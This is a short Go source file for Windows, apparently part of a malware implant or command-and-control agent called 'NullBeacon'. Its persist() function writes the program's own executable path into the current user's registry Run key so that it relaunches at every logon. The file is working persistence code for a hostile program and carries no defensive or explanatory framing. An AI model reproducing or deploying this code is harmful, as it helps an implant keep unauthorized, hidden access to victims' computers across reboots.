//go:build windows

package main

import (
	"log"
	"os"

	"golang.org/x/sys/windows/registry"
)

func persist() {
	execPath, err := os.Executable()
	if err != nil {
		log.Printf("failed to get executable path: %v", err)
		return
	}
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		log.Printf("failed to create registry key: %v", err)
		return
	}
	defer key.Close()
	err = key.SetStringValue("NullBeacon", execPath)
	if err != nil {
		log.Printf("failed to set registry value: %v", err)
		return
	}
	log.Println("Persistence set up in Windows registry.")
}
